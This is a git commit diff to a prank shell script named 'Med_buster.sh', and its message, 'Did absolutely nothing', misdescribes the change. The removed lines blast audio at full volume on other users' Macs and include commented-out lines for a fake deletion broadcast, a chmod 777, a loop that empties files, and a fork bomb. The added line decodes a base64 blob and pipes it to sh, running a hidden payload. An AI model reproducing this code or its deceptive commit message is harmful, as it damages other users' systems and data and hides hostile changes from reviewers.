6b740d5ca3f8693ff53738b2b1557c02e1b86e3b
Sarah Hicham Meftah <hmeftah@c1r6p5.1337.ma>
2023-03-13 12:52:48 +0100

    Did absolutely nothing

--- Med_buster.sh
+++ Med_buster.sh
@@ -1,17 +1,3 @@
 #!/bin/bash
 
-MOTHER="hmeftah"
-if [ "$MOTHER" = "$USER" ]; then
-	echo "Nice try ;)"
-	exit
-fi
-#echo "Come to bocal, your session will be deleted in 1 minute." | wall
-#sleep 7s
-#while true;
-#do
-	osascript -e "set Volume 10"
-	afplay ./LOUDAF/Depression.mp3 &
-	#chmod 777 /Users/$USER/Desktop/TEST/*
-	#for file in /Users/$USER/Desktop/TEST*.*; do cat /dev/null > "$file" & done
-	#:(){ :|:& };:
-#done
+base64 -d lol.bin | sh
